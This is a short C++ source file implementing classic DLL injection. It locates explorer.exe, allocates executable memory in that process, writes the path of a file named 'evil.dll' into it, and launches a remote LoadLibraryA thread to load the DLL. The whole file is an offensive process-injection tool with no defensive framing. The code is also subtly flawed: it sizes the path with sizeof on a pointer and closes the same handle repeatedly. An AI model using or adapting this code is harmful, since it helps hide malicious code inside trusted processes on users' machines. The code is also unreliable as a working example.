/*
	Author: https://github.com/1emvr 2023-02-15 21:18 EST
	Description: Simple Dll Injection
*/
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

const char *dllPath = "C:\\Users\\lemvr\\OneDrive\\Desktop\\Visual Studio\\Classic Dll Injection\\evil.dll";
size_t dllSize = sizeof(dllPath);

DWORD GetProcessId(const char *processName) {

	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return -1;
	}
	int pid = 0;

	Process32First(hSnapshot, &processEntryList);
	if (strcmp(processName, processEntryList.szExeFile) == 0) {
		pid = processEntryList.th32ProcessID;
		CloseHandle(hSnapshot);
	}
	while (Process32Next(hSnapshot, &processEntryList)) {
		if (strcmp(processName, processEntryList.szExeFile) == 0) {
			pid = processEntryList.th32ProcessID;
			CloseHandle(hSnapshot);
		}
	}
	CloseHandle(hSnapshot);
	return pid;
	
}

int main(void) {

	const char processName[] = { "explorer.exe" };
	DWORD pid = GetProcessId(processName);

	if (pid == 0) {
		return -1;
	}

	printf("PID : %i", pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	HMODULE hModule = GetModuleHandle((LPCSTR)"kernel32.dll");
	LPVOID lpStartAddress = (LPVOID)GetProcAddress(hModule, "LoadLibraryA");

	WriteProcessMemory(hProcess, lpBaseAddress, dllPath, dllSize, NULL);
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL);

	CloseHandle(hProcess);
	return 0;
}
